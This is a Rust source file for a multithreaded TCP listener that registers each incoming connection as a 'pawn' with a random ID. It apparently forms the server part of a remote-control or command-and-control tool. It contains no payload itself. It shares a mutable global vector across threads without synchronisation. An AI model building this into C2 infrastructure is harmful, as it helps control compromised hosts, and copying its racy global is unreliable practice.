use std::thread;
use std::process::exit;
use std::net::{TcpListener, TcpStream};
use core::arch::x86_64::_rdrand16_step;
use std::time::Duration;
use crate::pawn::*;

const RW_TIMEOUT: Option<Duration> = Some(Duration::from_secs(10));

#[allow(non_upper_case_globals)]
pub static mut current_pawns: Vec<Pawn> = Vec::new();

#[allow(unused_assignments)]
fn handler(stream: TcpStream) {
	
	let mut pawnid: u16 = 0;
	let _ = stream.set_nodelay(true);
	let (_,_) = (stream.set_read_timeout(RW_TIMEOUT),
				 stream.set_write_timeout(RW_TIMEOUT));
	let csock = stream.peer_addr().unwrap();
	
	println!("[+] new pawn {}", csock.ip());


	unsafe {

		let _ = _rdrand16_step(&mut pawnid);
	}
	
	let pawnid: u32 = pawnid.into();

	unsafe {
		current_pawns.push(
			Pawn::new(
				pawnid,
				stream,
				csock.ip(), 
				csock.port()
			)
		);
	}
}

pub fn listen(ip: &str, port: u16) {
	let listener = TcpListener::bind(format!("{}:{}", ip, port));

	match listener {
		Ok(lis) => {
			println!("[+] started listening on {ip}:{port}");
			for stream in lis.incoming() {
				thread::spawn(move || {
					handler(stream.unwrap());
				});
			}
		},
		Err(_err) => {
			eprintln!("[err] unable to listen on {ip}:{port}");
			exit(1);
		},
	}
}
